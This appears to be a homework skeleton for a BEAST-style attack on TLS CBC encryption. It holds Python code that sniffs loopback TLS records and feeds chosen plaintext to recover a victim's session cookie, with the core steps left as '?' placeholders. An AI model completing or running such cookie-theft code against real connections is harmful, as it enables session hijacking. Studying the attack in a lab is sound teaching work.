from socket import *
from scapy.all import sniff, Raw, TCP
import threading

BLOCK_SIZE = 16
STARTING_COOKIE_BLOCK = 17
COOKIE_BLOCK_NUM = STARTING_COOKIE_BLOCK
host = "127.0.0.3"
file_path = "aaaaaaaaaaabfffffffffffffff"
stop_sniffing = False
captured_packet = None

condition = threading.Condition()
condition_met = False
my_last_captured = None #fix for the problem of sniffing every packet twice

'''
POST /aaaaaaaaaa
abffffffffffffff
f HTTP/1.1\r\nCont
ent-Type: text/p
lain\r\nUser-Agent
: Mozilla/4.0 (L
inux 5.15.153.1-
microsoft-standa
rd-WSL2) Java/1.
7.0\r\nHost: 127.0
.0.3\r\nAccept: te
xt/html, image/g
if, image/jpeg, 
*; q=.2, */*; q=
.2\r\nConnection: 
keep-alive\r\nCont
ent-Length: 16\r\n
Cookie: session_
id=Secret_Val\r\n\r
\n
'''

# Function to sniff packets
def sniff_packets():
    global stop_sniffing, captured_packet,condition_met,my_last_captured

    def packet_callback(packet):
        global captured_packet, stop_sniffing,condition_met,my_last_captured
        if TCP in packet and (packet[TCP].dport == 443):
            if Raw in packet:
                raw_data = packet[Raw].load
                # Check if the first byte of the Raw layer is 0x17 (TLS Application Data)
                if raw_data and raw_data[0] == 0x17 and raw_data != my_last_captured:
                    with condition:
                        captured_packet = raw_data
                        my_last_captured = raw_data #fix for the problem of sniffing every packet twice
                        condition_met = True
                        condition.notify()

    def stop_filter(packet):
        return stop_sniffing

    # Start sniffing packets in the background
    sniff(iface='lo', filter='tcp', prn=packet_callback, stop_filter=stop_filter)
###

def init_server_socket(port):
    server = socket(AF_INET, SOCK_STREAM) # (IPV4, TCP) socket object 
    server.bind((host, port))
    server.listen(1)
    return server

def block_xor(b1, b2, b3):
    s = b''
    for c1, c2, c3 in zip(b1, b2, b3):
      s += bytes([c1 ^ c2 ^ c3])
    return s

def request_func(step):
    """
      Construct the current file_path
    """
    #Complete missing part below
    #Hint: step = len(attacker_cookie)
    ?
    

def main(sock):
    global stop_sniffing, captured_packet,condition_met
    global file_path , COOKIE_BLOCK_NUM, STARTING_COOKIE_BLOCK, BLOCK_SIZE
    curr_file_path = file_path
    iv = None
    i_know = b'Cookie: session'
    attacker_cookie = b''
    cipher = None
    
    while attacker_cookie[-4:] != b'\r\n\r\n':
        print("Attacker_cookie = ",end="")
        print(attacker_cookie)
        #Complete missing part below
        for i in range(?):
            #make the victim send the encrypted cookie
            sock.sendall(curr_file_path.encode() + b'\n') #followed by a newline character to match victim's `readLine()`
            with condition:
                while not condition_met:
                    condition.wait()
                cipher = captured_packet[5:]
                condition_met = False
            
            #Complete missing parts below
            iv = ?
            cookie_cipher = ?
            prev_cipher = ?

            guess = i_know + ?
            guess = block_xor(guess,iv,prev_cipher)
            sock.sendall(guess)

            with condition:
                while not condition_met:
                    condition.wait()
                cipher = captured_packet[5:]    
                condition_met = False

            #Complete missing parts below
            if cipher[?] == cookie_cipher:
                ?
                break

        curr_file_path = request_func(len(attacker_cookie))
        #Complete missing parts below
        #COOKIE_BLOCK_NUM is the current cookie block of the byte we are looking for 
        COOKIE_BLOCK_NUM = ?
    
    stop_sniffing = True
    print("Victim's cookie = ", attacker_cookie)


if __name__ == '__main__':
    sniff_thread = threading.Thread(target=sniff_packets)

    server = init_server_socket(port=1337)
    connection, victim_address = server.accept()

    sniff_thread.start()
    main(connection)

    connection.close()
    server.close()

    sniff_thread.join()